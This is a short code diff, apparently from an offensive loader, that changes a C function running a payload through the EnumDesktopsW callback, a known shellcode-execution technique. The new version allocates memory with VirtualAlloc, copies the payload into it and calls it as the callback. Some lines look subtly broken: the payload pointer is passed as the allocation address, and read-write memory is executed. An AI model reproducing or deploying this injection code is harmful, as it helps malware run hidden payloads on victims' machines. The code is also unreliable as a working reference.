@@ -62,9 +62,12 @@ BOOLEAN InjectCallbackPayloadEnumDesktops
 {
 	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
 
-	PUCHAR pLocalPayload = NULL;
-	if (!MapLocalMemory(pPayload, &pLocalPayload, sPayloadSize, phMappedMemoryHandle))return FALSE;
-	
+	PUCHAR pLocalPayload;
+
+	if (!(pLocalPayload = VirtualAlloc(pPayload, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
+
 	EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)pLocalPayload, NULL);
 
 	*pInjectedPayloadAddress = pLocalPayload;
